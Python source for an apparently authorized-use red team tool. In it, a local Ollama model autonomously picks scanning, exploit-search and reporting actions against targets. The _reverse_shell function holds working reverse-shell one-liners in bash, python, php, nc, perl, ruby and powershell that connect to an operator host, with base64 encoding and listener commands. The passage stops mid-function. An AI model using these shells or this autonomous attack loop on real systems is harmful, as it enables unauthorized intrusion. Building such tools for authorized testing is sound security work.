"""
RedTeam AI Controller — Ollama Edition
=======================================
Integrates your local Ollama model (llama3.1:8b or any model) as the AI brain
that drives the entire red team MCP toolchain.

Architecture:
  User Input → OllamaController → ToolDispatcher → Tool Execution
  → ResultAnalyzer → loop until goal complete or user exits

Usage:
    python ai_controller.py
    python ai_controller.py --model llama3.1:8b --target 192.168.1.10
    python ai_controller.py --auto "run full recon on 10.0.0.5"
    python ai_controller.py --auto "pentest http://10.0.0.5" --max-steps 20
"""

import requests
import json
import subprocess
import socket
import argparse
import sys
import os
import re
import time
import base64
import urllib.parse
import ipaddress
import httpx
from datetime import datetime
from typing import Optional
from packaging.version import Version

# ── Configuration ──────────────────────────────────────────────────────────────

OLLAMA_CHAT_URL = "http://127.0.0.1:11434/api/chat"
DEFAULT_MODEL   = "llama3.1:8b"
REPORTS_DIR     = os.path.join(os.path.dirname(__file__), "reports")

# ── Input Validation Helpers ───────────────────────────────────────────────────

def _validate_target(t: str) -> bool:
    """Accept IPv4, IPv6, or a safe hostname/domain."""
    try:
        ipaddress.ip_address(t)
        return True
    except ValueError:
        return bool(re.match(r'^[a-zA-Z0-9.\-]+$', t))

def _validate_ip(ip: str) -> bool:
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False

def _validate_port(port) -> bool:
    try:
        return 1 <= int(port) <= 65535
    except (TypeError, ValueError):
        return False

def _validate_url(url: str) -> bool:
    return isinstance(url, str) and url.startswith(("http://", "https://"))

# ── CVE Database (version-range aware) ────────────────────────────────────────

CVE_DB = [
    {
        "service": "apache",
        "version_min": "2.4.49", "version_max": "2.4.50",
        "cves": ["CVE-2021-41773"],
        "severity": "Critical", "description": "Path Traversal / RCE",
    },
    {
        "service": "apache",
        "version_min": "2.4.50", "version_max": "2.4.51",
        "cves": ["CVE-2021-42013"],
        "severity": "Critical", "description": "Path Traversal (bypass of 41773 fix)",
    },
    {
        "service": "vsftpd",
        "version_exact": "2.3.4",
        "cves": ["CVE-2011-2523"],
        "severity": "Critical", "description": "Backdoor RCE",
    },
    {
        "service": "openssh",
        "version_min": "2.3", "version_max": "7.6",
        "cves": ["CVE-2018-15473"],
        "severity": "Medium", "description": "Username enumeration",
    },
    {
        "service": "samba",
        "version_min": "3.5.0", "version_max": "4.6.3",
        "cves": ["CVE-2017-7494"],
        "severity": "Critical", "description": "SambaCry EternalRed RCE",
    },
    {
        "service": "log4j",
        "version_min": "2.0", "version_max": "2.14.1",
        "cves": ["CVE-2021-44228"],
        "severity": "Critical", "description": "Log4Shell JNDI RCE",
    },
    {
        "service": "openssl",
        "version_min": "1.0.1", "version_max": "1.0.1f",
        "cves": ["CVE-2014-0160"],
        "severity": "Critical", "description": "Heartbleed",
    },
    {
        "service": "struts",
        "version_min": "2.3.5", "version_max": "2.3.31",
        "cves": ["CVE-2017-5638"],
        "severity": "Critical", "description": "Jakarta RCE",
    },
    {
        "service": "drupal",
        "version_min": "7.0", "version_max": "7.57",
        "cves": ["CVE-2018-7600"],
        "severity": "Critical", "description": "Drupalgeddon2 RCE",
    },
    {
        "service": "iis",
        "version_exact": "6.0",
        "cves": ["CVE-2017-7269"],
        "severity": "Critical", "description": "Buffer Overflow RCE",
    },
]

# ── ANSI Colors ────────────────────────────────────────────────────────────────

class C:
    RED    = "\033[91m"
    GREEN  = "\033[92m"
    YELLOW = "\033[93m"
    BLUE   = "\033[94m"
    CYAN   = "\033[96m"
    WHITE  = "\033[97m"
    BOLD   = "\033[1m"
    DIM    = "\033[2m"
    RESET  = "\033[0m"

def banner():
    print(f"""
{C.RED}{C.BOLD}
 ██████╗ ███████╗██████╗ ████████╗███████╗ █████╗ ███╗   ███╗
 ██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██╔════╝██╔══██╗████╗ ████║
 ██████╔╝█████╗  ██║  ██║   ██║   █████╗  ███████║██╔████╔██║
 ██╔══██╗██╔══╝  ██║  ██║   ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║
 ██║  ██║███████╗██████╔╝   ██║   ███████╗██║  ██║██║ ╚═╝ ██║
 ╚═╝  ╚═╝╚══════╝╚═════╝    ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝
{C.RESET}
{C.CYAN}        AI-Powered Red Team Controller — Ollama Edition{C.RESET}
{C.DIM}        Authorized penetration testing use only{C.RESET}
""")

def ts():
    return datetime.now().strftime("%H:%M:%S")

def log_info(msg):    print(f"{C.DIM}[{ts()}]{C.RESET} {C.CYAN}[*]{C.RESET} {msg}")
def log_success(msg): print(f"{C.DIM}[{ts()}]{C.RESET} {C.GREEN}[+]{C.RESET} {msg}")
def log_warn(msg):    print(f"{C.DIM}[{ts()}]{C.RESET} {C.YELLOW}[!]{C.RESET} {msg}")
def log_error(msg):   print(f"{C.DIM}[{ts()}]{C.RESET} {C.RED}[-]{C.RESET} {msg}")
def log_ai(msg):      print(f"{C.DIM}[{ts()}]{C.RESET} {C.BLUE}[AI]{C.RESET} {msg}")

def log_finding(severity, title):
    colors = {"Critical": C.RED, "High": C.YELLOW, "Medium": C.CYAN, "Low": C.WHITE}
    c = colors.get(severity, C.WHITE)
    print(f"{C.DIM}[{ts()}]{C.RESET} {c}[FINDING — {severity.upper()}]{C.RESET} {title}")

# ── System Prompt ──────────────────────────────────────────────────────────────

SYSTEM_PROMPT = """You are an autonomous red team AI controller operating inside an authorized penetration test.

Your job is to analyze the user's request or the output of a previous tool, then decide the best next action.

You MUST respond ONLY with valid JSON. No markdown, no explanation, no prose. Raw JSON only.

=== AVAILABLE ACTIONS ===

RECON:
{"action": "nmap_scan", "target": "IP", "ports": "1-1000", "flags": "-sV"}
{"action": "dns_recon", "target": "domain"}
{"action": "whois", "target": "domain or IP"}
{"action": "subdomain_enum", "target": "domain", "wordlist": null}
{"action": "banner_grab", "target": "IP", "port": 80}

VULN SCANNING:
{"action": "nikto_scan", "target": "IP or domain", "port": 80, "ssl": false}
{"action": "http_headers", "url": "http://target", "verify_ssl": true}
{"action": "analyze_service", "service": "Apache httpd", "version": "2.4.49"}
{"action": "nmap_vuln_scripts", "target": "IP", "ports": "80,443,22"}

EXPLOIT RESEARCH:
{"action": "searchsploit", "query": "vsftpd 2.3.4"}
{"action": "reverse_shell", "lhost": "10.0.0.1", "lport": 4444, "type": "bash"}
{"action": "encode_payload", "payload": "...", "encoding": "base64"}
{"action": "msf_search", "query": "eternalblue"}

REPORTING:
{"action": "log_finding", "title": "...", "severity": "Critical|High|Medium|Low|Informational",
 "target": "...", "description": "...", "evidence": "...", "recommendation": "..."}
{"action": "generate_report", "client": "...", "tester": "...", "scope": "...", "format": "markdown"}
{"action": "generate_report", "client": "...", "tester": "...", "scope": "...", "format": "json"}

ORCHESTRATION:
{"action": "full_recon", "target": "IP or domain"}
{"action": "web_assessment", "url": "http://target"}
{"action": "network_assessment", "target": "IP", "ports": "1-65535"}
{"action": "quick_triage", "target": "IP"}

CONTROL:
{"action": "ask_user", "question": "Ask the operator a clarifying question"}
{"action": "summarize", "message": "Provide a summary or conclusion to the user"}
{"action": "done", "message": "Engagement complete — explain what was found"}

=== RULES ===
1. Always start with reconnaissance before exploitation
2. Never assume a target is in scope — if unsure, use ask_user
3. After a scan, analyze output and log important findings with log_finding
4. Chain actions logically: recon → vuln scan → exploit research → report
5. Return ONE action per response
6. When you have enough info, use summarize or done

Respond with JSON only. No markdown. No explanation.
"""

# ── Ollama Client ──────────────────────────────────────────────────────────────

class OllamaClient:
    def __init__(self, model: str = DEFAULT_MODEL, url: str = OLLAMA_CHAT_URL):
        self.model  = model
        self.url    = url
        self.conversation_history: list[dict] = []

    def check_connection(self) -> bool:
        try:
            r = requests.get("http://127.0.0.1:11434/api/tags", timeout=3)
            if r.status_code == 200:
                models = [m["name"] for m in r.json().get("models", [])]
                if any(self.model.split(":")[0] in m for m in models):
                    log_success(f"Ollama connected — model: {self.model}")
                    return True
                else:
                    log_warn(f"Model '{self.model}' not found. Available: {models}")
                    log_warn(f"Pull it with: ollama pull {self.model}")
                    return False
        except requests.exceptions.ConnectionError:
            log_error("Cannot connect to Ollama at http://127.0.0.1:11434")
            log_error("Start it with: ollama serve")
            return False
        except Exception as e:
            log_error(f"Ollama check failed: {e}")
            return False

    def query(self, user_message: str, context: str = "") -> str:
        """Send a message using the /api/chat endpoint with full conversation history."""
        content = user_message
        if context:
            content = f"{context}\n\nOperator: {user_message}"

        # Add system prompt on first message
        if not self.conversation_history:
            self.conversation_history.append({"role": "system", "content": SYSTEM_PROMPT})

        self.conversation_history.append({"role": "user", "content": content})

        # Cap history at 20 messages (+ system prompt)
        if len(self.conversation_history) > 21:
            self.conversation_history = (
                self.conversation_history[:1] + self.conversation_history[-20:]
            )

        payload = {
            "model":    self.model,
            "messages": self.conversation_history,
            "stream":   False,
            "options":  {"temperature": 0.1, "top_p": 0.9, "num_predict": 512},
        }

        try:
            r = requests.post(self.url, json=payload, timeout=120)
            r.raise_for_status()
            data = r.json()
            response_text = data.get("message", {}).get("content", "").strip()
            self.conversation_history.append({"role": "assistant", "content": response_text})
            return response_text
        except requests.exceptions.Timeout:
            log_error("Ollama request timed out after 120s")
            return '{"action": "ask_user", "question": "LLM timed out. Please retry."}'
        except Exception as e:
            log_error(f"Ollama request failed: {e}")
            return '{"action": "ask_user", "question": "LLM error. Please retry."}'

    def parse_json_response(self, raw: str) -> Optional[dict]:
        """Robustly parse JSON from LLM output — handles fences and leading text."""
        cleaned = raw.strip()

        # Strip markdown fences
        if "```json" in cleaned:
            cleaned = cleaned.split("```json")[1].split("```")[0].strip()
        elif "```" in cleaned:
            cleaned = cleaned.split("```")[1].split("```")[0].strip()

        # Direct parse
        try:
            return json.loads(cleaned)
        except json.JSONDecodeError:
            pass

        # Extract outermost JSON object
        start = cleaned.find("{")
        end   = cleaned.rfind("}") + 1
        if start != -1 and end > start:
            try:
                return json.loads(cleaned[start:end])
            except json.JSONDecodeError:
                pass

        log_warn(f"Could not parse JSON from LLM response:\n{raw[:300]}")
        return None

    def query_with_retry(
        self,
        user_message: str,
        context: str = "",
        max_retries: int = 3,
    ) -> Optional[dict]:
        """Query the LLM and retry up to max_retries times on JSON parse failure."""
        for attempt in range(max_retries):
            raw    = self.query(user_message, context)
            result = self.parse_json_response(raw)
            if result and "action" in result:
                return result

            log_warn(f"[Retry {attempt+1}/{max_retries}] JSON parse failed, retrying...")
            user_message = (
                f"Your previous response could not be parsed as valid JSON. "
                f"Attempt {attempt + 1} of {max_retries}. "
                f"You MUST respond with ONLY a JSON object. No explanation, no markdown. "
                f'Example: {{"action": "nmap_scan", "target": "192.168.1.10", "ports": "1-1000"}}'
            )
            context = ""

        log_error("Failed to get valid JSON from LLM after max retries")
        return None

# ── Tool Dispatcher ────────────────────────────────────────────────────────────

class ToolDispatcher:

    def __init__(self):
        self.findings:        list[dict] = []
        self.engagement_meta: dict       = {}
        self.session_log:     list[str]  = []

    def _log(self, entry: str):
        self.session_log.append(f"[{ts()}] {entry}")

    def dispatch(self, action_data: dict) -> str:
        action = action_data.get("action", "").lower()

        dispatch_map = {
            "nmap_scan":          self._nmap_scan,
            "dns_recon":          self._dns_recon,
            "whois":              self._whois,
            "subdomain_enum":     self._subdomain_enum,
            "banner_grab":        self._banner_grab,
            "nikto_scan":         self._nikto_scan,
            "http_headers":       self._http_headers,
            "analyze_service":    self._analyze_service,
            "nmap_vuln_scripts":  self._nmap_vuln_scripts,
            "searchsploit":       self._searchsploit,
            "reverse_shell":      self._reverse_shell,
            "encode_payload":     self._encode_payload,
            "msf_search":         self._msf_search,
            "log_finding":        self._log_finding,
            "generate_report":    self._generate_report,
            "full_recon":         self._full_recon,
            "web_assessment":     self._web_assessment,
            "network_assessment": self._network_assessment,
            "quick_triage":       self._quick_triage,
        }

        handler = dispatch_map.get(action)
        if not handler:
            return f"Unknown action '{action}'. Check available actions in the system prompt."

        self._log(
            f"Dispatching: {action} | args: "
            + json.dumps({k: v for k, v in action_data.items() if k != "action"})
        )
        return handler(action_data)

    # ── Safe summary helper ────────────────────────────────────────────────────

    def _safe_summary(self, data: dict, max_chars: int = 4000) -> str:
        """Truncate individual values BEFORE serialising — keeps JSON valid."""
        summary = {}
        for k, v in data.items():
            s = str(v)
            summary[k] = (s[:500] + "...[truncated]") if len(s) > 500 else v
        return json.dumps(summary, indent=2)

    # ── Recon tools ───────────────────────────────────────────────────────────

    def _nmap_scan(self, d: dict) -> str:
        target = str(d.get("target", ""))
        ports  = str(d.get("ports",  "1-1000"))
        flags  = str(d.get("flags",  "-sV"))

        # Input validation — fixes command injection vulnerability
        if not target or not _validate_target(target):
            return "Error: invalid target — must be a valid IP address or hostname"
        if not re.match(r'^[\d\-,]+$', ports):
            return "Error: invalid port specification — use digits, hyphens, commas only"
        if not re.match(r'^[-a-zA-Z0-9 ]+$', flags):
            return "Error: invalid flags — only alphanumeric characters and hyphens allowed"

        log_info(f"nmap {flags} -p {ports} --open {target}")
        try:
            cmd = ["nmap"] + flags.split() + ["-p", ports, "--open", target]
            r   = subprocess.run(cmd, shell=False, capture_output=True, text=True, timeout=120)
            output = r.stdout or r.stderr
            log_success(f"nmap complete ({len(output)} bytes)")
            return output
        except subprocess.TimeoutExpired:
            return "nmap timed out after 120s"
        except FileNotFoundError:
            return "nmap not installed. Run: sudo apt install nmap"
        except Exception as e:
            return f"nmap error: {e}"

    def _dns_recon(self, d: dict) -> str:
        target = d.get("target", "")
        log_info(f"DNS recon: {target}")
        records: dict = {}
        errors:  dict = {}
        for rtype in ["A", "MX", "NS", "TXT", "AAAA"]:
            try:
                r = subprocess.run(
                    ["dig", "+short", rtype, target],
                    capture_output=True, text=True, timeout=8,
                )
                if r.stdout.strip():
                    records[rtype] = r.stdout.strip().splitlines()
            except Exception as e:
                errors[rtype] = str(e)
        log_success(f"DNS recon done — {len(records)} record types, {len(errors)} errors")
        return json.dumps({"domain": target, "records": records, "errors": errors}, indent=2)

    def _whois(self, d: dict) -> str:
        target = d.get("target", "")
        log_info(f"WHOIS: {target}")
        try:
            r = subprocess.run(["whois", target], capture_output=True, text=True, timeout=15)
            return r.stdout[:3000]
        except Exception as e:
            return f"whois error: {e}"

    def _subdomain_enum(self, d: dict) -> str:
        target   = d.get("target", "")
        wordlist = d.get("wordlist")
        log_info(f"Subdomain enum: {target}")

        default_subs = [
            "www","mail","ftp","admin","dev","staging","api","vpn","remote","test",
            "portal","shop","blog","secure","mx","ns1","ns2","smtp","pop","imap",
            "webmail","jenkins","gitlab","jira","confluence","dashboard","app",
            "auth","login","cdn","static","beta","prod",
        ]
        subs = default_subs
        if wordlist:
            try:
                with open(wordlist) as f:
                    subs = [line.strip() for line in f if line.strip()]
            except Exception as e:
                log_warn(f"Could not open wordlist: {e} — using defaults")

        found = []
        for sub in subs:
            fqdn = f"{sub}.{target}"
            try:
                ip = socket.gethostbyname(fqdn)
                found.append({"subdomain": fqdn, "ip": ip})
            except socket.gaierror:
                pass

        log_success(f"Subdomain enum done — {len(found)}/{len(subs)} resolved")
        return json.dumps({"domain": target, "found": found}, indent=2)

    def _banner_grab(self, d: dict) -> str:
        host    = d.get("target", "")
        port    = int(d.get("port", 80))
        timeout = int(d.get("timeout", 5))
        log_info(f"Banner grab: {host}:{port}")
        try:
            with socket.create_connection((host, port), timeout=timeout) as s:
                # HTTP/1.1 with Host header — fixes HTTP/1.0 400 Bad Request bug
                request = f"HEAD / HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n"
                s.sendall(request.encode())
                result = s.recv(512).decode("utf-8", errors="replace")
            log_success(f"Banner captured ({len(result)} bytes)")
            return result
        except Exception as e:
            return f"Banner grab failed: {e}"

    # ── Vuln tools ────────────────────────────────────────────────────────────

    def _nikto_scan(self, d: dict) -> str:
        target = d.get("target", "")
        port   = int(d.get("port", 80))
        ssl    = d.get("ssl", False)
        log_info(f"Nikto scan: {target}:{port}")
        cmd = ["nikto", "-h", target, "-p", str(port), "-Format", "txt", "-maxtime", "120"]
        if ssl:
            cmd.append("-ssl")
        try:
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=150)
            log_success(f"Nikto done ({len(r.stdout)} bytes)")
            return r.stdout or "No output from nikto"
        except FileNotFoundError:
            return "nikto not installed. Run: sudo apt install nikto"
        except subprocess.TimeoutExpired:
            return "nikto timed out"
        except Exception as e:
            return f"nikto error: {e}"

    def _http_headers(self, d: dict) -> str:
        url = d.get("url", "")
        if not _validate_url(url):
            return "Error: invalid URL — must start with http:// or https://"

        # verify_ssl is now configurable with a warning when disabled
        verify = d.get("verify_ssl", True)
        if not verify:
            log_warn("TLS certificate verification disabled — use only on authorized targets")

        log_info(f"HTTP header analysis: {url}")
        security_headers = [
            "Strict-Transport-Security", "Content-Security-Policy",
            "X-Frame-Options", "X-Content-Type-Options",
            "Referrer-Policy", "Permissions-Policy",
        ]
        try:
            resp    = httpx.get(url, timeout=10, follow_redirects=True, verify=verify)
            headers = dict(resp.headers)
            missing = [h for h in security_headers if h.lower() not in {k.lower() for k in headers}]
            result  = {
                "status_code":              resp.status_code,
                "server":                   headers.get("server", "not disclosed"),
                "x_powered_by":             headers.get("x-powered-by", "not disclosed"),
                "missing_security_headers": missing,
                "all_headers":              dict(headers),
            }
            log_success(f"Headers checked — {len(missing)} missing security headers")
            return json.dumps(result, indent=2)
        except Exception as e:
            return f"HTTP header check failed: {e}"

    def _analyze_service(self, d: dict) -> str:
        service     = d.get("service", "").lower().strip()
        version_str = d.get("version", "").strip()
        log_info(f"Analyzing: {service} {version_str}")

        hits = []
        for entry in CVE_DB:
            if entry["service"] not in service:
                continue
            try:
                v = Version(version_str)
                if "version_exact" in entry:
                    if v == Version(entry["version_exact"]):
                        hits.append(entry)
                else:
                    if Version(entry["version_min"]) <= v <= Version(entry["version_max"]):
                        hits.append(entry)
            except Exception:
                continue

        cve_list = []
        for h in hits:
            label = f"[{h['severity']}] {', '.join(h['cves'])} — {h['description']}"
            cve_list.append(label)
            log_finding(h["severity"], f"{', '.join(h['cves'])} — {h['description']}")

        result = {
            "service":    service,
            "version":    version_str,
            "known_cves": cve_list,
            "note":       "No known CVEs in local DB" if not hits else f"{len(hits)} match(es) found",
            "nvd_url":    f"https://nvd.nist.gov/vuln/search/results?query={service}+{version_str}",
        }
        log_success(f"Analysis done — {len(hits)} CVE matches")
        return json.dumps(result, indent=2)

    def _nmap_vuln_scripts(self, d: dict) -> str:
        target = str(d.get("target", ""))
        ports  = str(d.get("ports", "80,443,22"))
        if not target or not _validate_target(target):
            return "Error: invalid target"
        log_info(f"nmap vuln scripts: {target} ports {ports}")
        try:
            r = subprocess.run(
                ["nmap", "-sV", "--script", "vuln", "-p", ports, target],
                capture_output=True, text=True, timeout=300,
            )
            log_success("Vuln scripts complete")
            return r.stdout
        except FileNotFoundError:
            return "nmap not installed"
        except subprocess.TimeoutExpired:
            return "nmap vuln scripts timed out"
        except Exception as e:
            return f"error: {e}"

    # ── Exploit tools ─────────────────────────────────────────────────────────

    def _searchsploit(self, d: dict) -> str:
        query = d.get("query", "")
        log_info(f"searchsploit: {query}")
        try:
            r = subprocess.run(
                ["searchsploit", "--json"] + query.split(),
                capture_output=True, text=True, timeout=20,
            )
            # Check exit code before attempting JSON parse
            if r.returncode != 0 or not r.stdout.strip():
                return (
                    f"searchsploit failed (exit {r.returncode}): "
                    + (r.stderr.strip() or "no output")
                )
            data     = json.loads(r.stdout)
            exploits = data.get("RESULTS_EXPLOIT", [])[:10]
            log_success(f"searchsploit: {len(exploits)} results")
            return json.dumps({"query": query, "count": len(exploits), "exploits": exploits}, indent=2)
        except FileNotFoundError:
            return f"searchsploit not installed. Online: https://www.exploit-db.com/search?q={query}"
        except json.JSONDecodeError:
            return "searchsploit returned non-JSON output"
        except Exception as e:
            return f"searchsploit error: {e}"

    def _reverse_shell(self, d: dict) -> str:
        lhost      = str(d.get("lhost", ""))
        lport      = d.get("lport", 4444)
        shell_type = d.get("type", "bash")

        # Input validation
        if not _validate_ip(lhost):
            return "Error: invalid LHOST — must be a valid IP address"
        if not _validate_port(lport):
            return "Error: invalid LPORT — must be between 1 and 65535"
        lport = int(lport)

        # Authorization gate — requires explicit confirmation
        print(f"\n{C.YELLOW}⚠️  WARNING: About to generate a reverse shell payload.{C.RESET}")
        print(f"   LHOST: {lhost}  LPORT: {lport}  TYPE: {shell_type}")
        confirm = input("   Type YES to confirm this is for an authorized target: ").strip()
        if confirm.upper() != "YES":
            return "Payload generation cancelled by operator."

        log_info(f"Generating {shell_type} reverse shell → {lhost}:{lport}")

        shells = {
            "bash":       f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            "python3":    (
                f"python3 -c 'import socket,subprocess,os;"
                f"s=socket.socket();s.connect((\"{lhost}\",{lport}));"
                f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
                f"subprocess.call([\"/bin/sh\",\"-i\"])'"
            ),
            "php":        f"php -r '$s=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            "nc":         f"nc -e /bin/sh {lhost} {lport}",
            "nc_mkfifo":  f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
            "perl":       (
                f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};"
                f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
                f"connect(S,sockaddr_in($p,inet_aton($i)));"
                f"open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
                f"exec(\"/bin/sh -i\");'"
            ),
            "ruby":       (
                f"ruby -rsocket -e 'exit if fork;"
                f"c=TCPSocket.new(\"{lhost}\",{lport});"
                f"$stdin=$stdout=$stderr=c;exec(\"/bin/sh -i\")'"
            ),
            "powershell": (
                f"powershell -NoP -NonI -W Hidden -Exec Bypass "
                f"-Command New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport})"
            ),
        }

        if shell_type not in shells:
            return f"Unknown shell type '{shell_type}'. Options: {', '.join(shells.keys())}"

        cmd = shells[shell_type]
        b64 = base64.b64encode(cmd.encode()).decode()
        log_success(f"Reverse shell generated ({shell_type})")
        return json.dumps({
            "shell_type":      shell_type,
            "command":         cmd,
            "base64":          b64,
            "listener":        f"nc -lvnp {lport}",
            "rlwrap_listener": f"rlwrap nc -lvnp {lport}",
        }, indent=2)

    def _encode_payload(self, d: dict) -> str:
        payload  = d.get("payload", "")
        encoding = d.get("encoding", "base64")
        if encoding == "base64":
            encoded = base64.b64encode(payload.encode()).decode()
        elif encoding == "url":
            encoded = urllib.parse.quote(payload)
        elif encoding == "hex":
            encoded = payload.encode().hex()
        else:
            return f"Unknown encoding '{encoding}'. Options: base64, url, hex"
        log_success(f"Payload encoded ({encoding})")
        return json.dumps({"original": payload, "encoding": encoding, "encoded": encoded}, indent=2)

    def _msf_search(self, d: dict) -> str:
        query = d.get("query", "")
        log_info(f"msfconsole search: {query}")
        try:
            r = subprocess.run(
                ["msfconsole", "-q", "-x", f"search {query}; exit"],
                capture_output=True, text=True, timeout=60,
            )
            log_success("MSF search complete")
            return r.stdout
        except FileNotFoundError:
            return f"msfconsole not found. Online: https://www.rapid7.com/db/?q={query}&type=metasploit"
        except Exception as e:
            return f"msfconsole error: {e}"

    # ── Reporting ─────────────────────────────────────────────────────────────

    def _log_finding(self, d: dict) -> str:
        finding = {
            "id":             f"FIND-{len(self.findings)+1:03d}",
            "title":          d.get("title",          "Untitled Finding"),
            "severity":       d.get("severity",       "Informational"),
            "target":         d.get("target",         "N/A"),
            "description":    d.get("description",    ""),
            "evidence":       d.get("evidence",       ""),
            "recommendation": d.get("recommendation", ""),
            "cve":            d.get("cve"),
            "cvss_score":     d.get("cvss_score"),
            "logged_at":      datetime.now().isoformat(),
        }
        self.findings.append(finding)
        log_finding(finding["severity"], finding["title"])
        return f"Finding logged: {finding['id']} — [{finding['severity']}] {finding['title']}"

    def _generate_report(self, d: dict) -> str:
        client = d.get("client", "Unknown Client")
        tester = d.get("tester", "Red Team Operator")
        scope  = d.get("scope",  "As discussed")
        fmt    = d.get("format", "markdown")

        os.makedirs(REPORTS_DIR, exist_ok=True)
        timestamp   = datetime.now().strftime("%Y%m%d_%H%M%S")
        safe_client = client.replace(" ", "_")

        severity_order = ["Critical", "High", "Medium", "Low", "Informational"]
        counts = {s: len([f for f in self.findings if f.get("severity") == s]) for s in severity_order}

        if counts["Critical"] > 0:   risk = "CRITICAL"
        elif counts["High"] > 0:     risk = "HIGH"
        elif counts["Medium"] > 0:   risk = "MEDIUM"
        elif counts["Low"] > 0:      risk = "LOW"
        else:                         risk = "INFORMATIONAL"

        log_info(f"Generating {fmt} report for {client} — {len(self.findings)} findings")

        if fmt == "json":
            data = {
                "client": client, "tester": tester, "scope": scope,
                "overall_risk": risk, "counts": counts,
                "findings": self.findings,
                "generated_at": datetime.now().isoformat(),
            }
            fname = f"{safe_client}_report_{timestamp}.json"
            fpath = os.path.join(REPORTS_DIR, fname)
            with open(fpath, "w") as fp:
                json.dump(data, fp, indent=2)
            log_success(f"JSON report saved: {fpath}")
            return f"Report saved to: {fpath}"

        icons = {"Critical": "🔴", "High": "🟠", "Medium": "🟡", "Low": "🔵", "Informational": "⚪"}
        lines = [
            "# Penetration Test Report",
            f"**CONFIDENTIAL — {client.upper()}**\n",
            "---\n",
            "## Engagement Details\n",
            "| Field | Value |",
            "|-------|-------|",
            f"| **Client** | {client} |",
            f"| **Lead Tester** | {tester} |",
            f"| **Scope** | {scope} |",
            f"| **Report Date** | {datetime.now().strftime('%Y-%m-%d')} |",
            f"| **Overall Risk** | **{risk}** |\n",
            "---\n",
            "## Executive Summary\n",
            f"This assessment identified **{len(self.findings)} finding(s)** "
            f"with overall risk rating of **{risk}**.\n",
            "| Severity | Count |",
            "|----------|-------|",
        ]
        for s in severity_order:
            lines.append(f"| {icons[s]} {s} | {counts[s]} |")

        lines += ["\n---\n", "## Findings\n"]
        if not self.findings:
            lines.append("*No findings were logged.*\n")
        else:
            for sev in severity_order:
                sev_findings = [f for f in self.findings if f.get("severity") == sev]
                if not sev_findings:
                    continue
                lines.append(f"\n### {icons[sev]} {sev} Severity\n")
                for finding in sev_findings:
                    lines += [
                        f"#### {finding['id']}: {finding['title']}\n",
                        f"**Severity:** {finding['severity']}  \n**Target:** `{finding['target']}`\n",
                        f"**Description:**\n{finding['description']}\n",
                        f"**Evidence:**\n```\n{finding['evidence']}\n```\n",
                        f"**Recommendation:**\n{finding['recommendation']}\n",
                        "---\n",
                    ]

        lines += [
            "## Disclaimer\n",
            "Report generated by authorized red team operator. "
            "Testing conducted within agreed scope.\n",
            f"*Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} | Prepared by: {tester}*",
        ]

        content = "\n".join(lines)
        fname   = f"{safe_client}_pentest_report_{timestamp}.md"
        fpath   = os.path.join(REPORTS_DIR, fname)
        with open(fpath, "w") as fp:
            fp.write(content)

        log_success(f"Report saved: {fpath}")
        return f"Pentest report saved to: {fpath}\nRisk: {risk} | Findings: {len(self.findings)}"

    # ── Workflow orchestrations ───────────────────────────────────────────────

    def _full_recon(self, d: dict) -> str:
        target = d.get("target", "")
        log_info(f"WORKFLOW: Full recon on {target}")
        results = {
            "whois":      self._whois({"target": target})[:1000],
            "dns":        self._dns_recon({"target": target}),
            "subdomains": self._subdomain_enum({"target": target}),
            "nmap":       self._nmap_scan({"target": target, "ports": "1-1000", "flags": "-sV"}),
        }
        log_success("Full recon workflow complete")
        return self._safe_summary(results)

    def _web_assessment(self, d: dict) -> str:
        url = d.get("url", "")
        log_info(f"WORKFLOW: Web assessment on {url}")
        parsed = urllib.parse.urlparse(url)
        host   = parsed.hostname or url
        port   = parsed.port or (443 if parsed.scheme == "https" else 80)
        results = {
            "headers": self._http_headers({"url": url}),
            "nikto":   self._nikto_scan({"target": host, "port": port, "ssl": parsed.scheme == "https"}),
        }
        log_success("Web assessment workflow complete")
        return self._safe_summary(results)

    def _network_assessment(self, d: dict) -> str:
        target = d.get("target", "")
        ports  = d.get("ports", "1-65535")
        log_info(f"WORKFLOW: Network assessment on {target}")
        results = {
            "nmap_sv":   self._nmap_scan({"target": target, "ports": ports, "flags": "-sV -sC"}),
            "nmap_vuln": self._nmap_vuln_scripts({"target": target, "ports": "22,80,443,445,3389"}),
        }
        log_success("Network assessment workflow complete")
        return self._safe_summary(results)

    def _quick_triage(self, d: dict) -> str:
        target = d.get("target", "")
        log_info(f"WORKFLOW: Quick triage on {target}")
        TOP_PORTS = "21,22,23,25,53,80,110,139,143,443,445,993,995,1433,3306,3389,5432,6379,8080,8443"
        result = self._nmap_scan({"target": target, "ports": TOP_PORTS, "flags": "-sV -T4"})
        log_success("Quick triage complete")
        return result


# ── Main AI Loop ───────────────────────────────────────────────────────────────

class RedTeamAI:
    def __init__(self, model: str = DEFAULT_MODEL):
        self.llm             = OllamaClient(model=model)
        self.dispatcher      = ToolDispatcher()
        self.last_output     = ""
        self.step            = 0
        self.max_auto_steps  = 15

    def _print_findings(self):
        findings = self.dispatcher.findings
        if not findings:
            print(f"\n{C.DIM}No findings logged yet.{C.RESET}")
            return
        print(f"\n{C.BOLD}{'━'*45}")
        print(f"FINDINGS SUMMARY — {len(findings)} total")
        print(f"{'━'*45}{C.RESET}")
        colors = {"Critical": C.RED, "High": C.YELLOW, "Medium": C.CYAN,
                  "Low": C.WHITE, "Informational": C.DIM}
        for finding in findings:
            sev = finding.get("severity", "?")
            c   = colors.get(sev, C.WHITE)
            print(f"  {c}[{sev:<14}]{C.RESET} {finding['id']} — {finding['title']}")
        print()

    def _print_history(self):
        log = self.dispatcher.session_log[-20:]
        if not log:
